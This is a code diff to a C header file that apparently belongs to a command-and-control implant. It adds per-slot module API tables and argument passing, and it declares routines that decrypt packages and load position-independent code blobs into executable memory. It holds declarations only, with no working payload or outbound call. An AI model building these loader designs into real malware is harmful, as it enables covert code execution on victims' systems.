@@ -136,6 +136,12 @@ NTSTATUS bus_init(IMPLANT_CONTEXT *ctx);
  */
 MODULE_BUS_API *bus_get_api(BUS_CONTEXT *bctx);
 
+/**
+ * Copy the global module API table into a per-slot table and route output
+ * writes to that slot's output ring.
+ */
+void bus_prepare_slot_api(MODULE_BUS_API *api, DWORD slot_idx);
+
 /* ------------------------------------------------------------------ */
 /*  Output ring buffer API                                             */
 /* ------------------------------------------------------------------ */
@@ -301,6 +307,8 @@ typedef struct _LOADED_MODULE {
     DWORD           status;          /* MODULE_STATUS_*                 */
     OUTPUT_RING    *output_ring;     /* Per-module output buffer ref    */
     MODULE_BUS_API *bus_api;         /* Bus API pointer for this module */
+    BYTE           *args;            /* Heap-owned module args          */
+    DWORD           args_len;        /* Module args length              */
 } LOADED_MODULE;
 
 /* ------------------------------------------------------------------ */
@@ -328,8 +336,7 @@ BOOL loader_decrypt_package(const BYTE *package, DWORD package_len,
 
 /**
  * Load a PIC (position-independent code) blob.
- * Allocates RW memory, copies blob, injects API table pointer at
- * offset 0 (first 8 bytes = pointer to MODULE_BUS_API), flips to RX.
+ * Allocates RW memory, copies blob, and flips to RX.
  * Returns entry point on success, NULL on failure.
  */
 PVOID loader_load_pic(const BYTE *blob, DWORD blob_len,
@@ -487,7 +494,8 @@ NTSTATUS modmgr_init(IMPLANT_CONTEXT *ctx);
  * len: total package length.
  * Returns the module slot index on success, -1 on failure.
  */
-int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len);
+int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len,
+                   const BYTE *args, DWORD args_len);
 
 /**
  * Poll running modules: check status, drain completed output, collect
